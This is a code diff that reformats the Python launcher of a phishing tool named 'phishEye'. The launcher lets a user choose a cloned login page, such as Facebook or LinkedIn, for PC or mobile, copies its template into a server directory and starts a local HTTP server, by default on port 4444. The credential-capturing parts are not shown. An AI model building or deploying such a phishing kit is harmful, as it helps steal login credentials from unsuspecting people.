@@ -2,6 +2,7 @@ import sys, socket
 import subprocess
 import pkg_resources
 
+
 def is_connected():
     try:
         host = socket.gethostbyname("1.1.1.1")
@@ -11,46 +12,53 @@ def is_connected():
     except:
         pass
     return False
-if(is_connected()):
+
+
+if is_connected():
     requirements = set()
 
-    with open('requirements.txt') as f:
+    with open("requirements.txt") as f:
         for line in f:
-            requirements.add(line.replace("\n",""))
+            requirements.add(line.replace("\n", ""))
 
     installed = {pkg.key for pkg in pkg_resources.working_set}
     missing = requirements - installed
 
     if missing:
-        print("Checking for required modules.\nIt'll install automatically if any modules are not installed...")
+        print(
+            "Checking for required modules.\nIt'll install automatically if any modules are not installed..."
+        )
         python = sys.executable
-        subprocess.check_call([python, '-m', 'pip', 'install', *missing], stdout=subprocess.DEVNULL)
+        subprocess.check_call(
+            [python, "-m", "pip", "install", *missing], stdout=subprocess.DEVNULL
+        )
 else:
-    print("Some modules are not installed.\nPlease install from requirements.txt or connect with internet to auto install.")               
+    print(
+        "Some modules are not installed.\nPlease install from requirements.txt or connect with internet to auto install."
+    )
 
 try:
-    import os
-    import shutil
-    import argparse
-    import sys
-    sys.path.append('./server/')
+    import os, shutil, argparse, sys, itertools
+
+    sys.path.append("./server/")
     from banner import *
 
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system("cls" if os.name == "nt" else "clear")
 
     def pre_site():
-        if not os.path.isdir('./server/templates'):
-            os.mkdir('./server/templates')
+        if not os.path.isdir("./server/templates"):
+            os.mkdir("./server/templates")
         else:
             shutil.rmtree("./server/templates/")
 
     def SitePath():
-        return './site/mob/' if device != 'pc' else './site/pc/'
+        return "./site/mob/" if device != "pc" else "./site/pc/"
 
     def copy(site):
         try:
-            shutil.copytree(f'{SitePath()}{site}',
-                            './server/templates/', dirs_exist_ok=True)
+            shutil.copytree(
+                f"{SitePath()}{site}", "./server/templates/", dirs_exist_ok=True
+            )
         except:
             print("Site page not found!!")
 
@@ -58,19 +66,32 @@ try:
         _site = []
         for i in [f.path for f in os.scandir(f"./site/{type}/") if f.is_dir()]:
             _site.append(i.replace(f"./site/{type}/", ""))
-        return str(_site).replace("[", "").replace("]", "").replace("\'", "")
+        return str(_site).replace("[", "").replace("]", "").replace("'", "")
 
-    if __name__ == '__main__':
+    if __name__ == "__main__":
         # Getting arguments
         parser = argparse.ArgumentParser(
-            description=f"Available Sites for mobile :- {sites('mob')} \n | Available Sites for desktop :- {sites('pc')} ", usage="%(prog)s [options]")
+            description=f"Available Sites for mobile :- {sites('mob')} \n | Available Sites for desktop :- {sites('pc')} ",
+            usage="%(prog)s [options]",
+        )
 
-        parser.add_argument("-s", metavar='Site name', default='facebook',
-                            type=str, help=" facebook / linkedin /... | default = facebook")
-        parser.add_argument("-p", metavar='Port number',
-                            default=4444, type=int, help=" default = 4444")
-        parser.add_argument("-d", metavar='Device name', default='pc',
-                            type=str, help=" pc / mob | default = pc")
+        parser.add_argument(
+            "-s",
+            metavar="Site name",
+            default="facebook",
+            type=str,
+            help=" facebook / linkedin /... | default = facebook",
+        )
+        parser.add_argument(
+            "-p", metavar="Port number", default=4444, type=int, help=" default = 4444"
+        )
+        parser.add_argument(
+            "-d",
+            metavar="Device name",
+            default="pc",
+            type=str,
+            help=" pc / mob | default = pc",
+        )
 
         # assigning values according to aruments
         args = parser.parse_args()
@@ -91,45 +112,47 @@ try:
             port = 4444
             PrintBanner()
 
-            #Choosing device name
+            # Choosing device name
             try:
                 print("Please choose device (default = PC):\n[1] PC \n[2] MOBILE")
                 _device = int(input("\nEnter here :"))
-                if(_device is not None):
-                    if(_device == 1):
+                if _device is not None:
+                    if _device == 1:
                         device = "pc"
-                    elif(_device == 2):
+                    elif _device == 2:
                         device = "mob"
                     else:
-                        print("Opps!!! You entred wrong key.\nI am taking default value") 
+                        print(
+                            "Opps!!! You entred wrong key.\nI am taking default value"
+                        )
             except KeyboardInterrupt:
                 sys.exit("\n\nThanks to try my phishEye.\nByeeeeeee......")
             except:
                 pass
-            #Choosing site name
+            # Choosing site name
             try:
                 print("\n\nPlease choose website name (default = facebook):")
                 _site = sites(device).split(", ")
                 for i in range(len(_site)):
                     print(f"[{i+1}] {_site[i]}")
                 _siteInpt = int(input("\nEnter here :"))
-                if(_site is not None and _siteInpt <= len(_site)):
-                    site = _site[_siteInpt-1]
+                if _site is not None and _siteInpt <= len(_site):
+                    site = _site[_siteInpt - 1]
                 else:
-                    print("Opps!!! You entred wrong key.\nI am taking default value")  
+                    print("Opps!!! You entred wrong key.\nI am taking default value")
             except KeyboardInterrupt:
                 sys.exit("\n\nThanks to try my phishEye.\nByeeeeeee......")
             except:
                 pass
-            #Choosing port number
+            # Choosing port number
             try:
                 _port = int(input("\n\nPlease enter port number (default = 4444): "))
-                if(_port is not None):
-                    port = _port 
+                if _port is not None:
+                    port = _port
             except KeyboardInterrupt:
                 sys.exit("\n\nThanks to try my phishEye.\nByeeeeeee......")
             except:
-                pass        
+                pass
             print("\n\nPlease wait.....")
 
             # Copy webpage to server
@@ -138,6 +161,6 @@ try:
 
             # Running server
             os.system(f"python3 ./server/httpServer.py -p {port}")
-                    
+
 except KeyboardInterrupt:
     print("\n\nThanks to try my phishEye.\nByeeeeeee......")
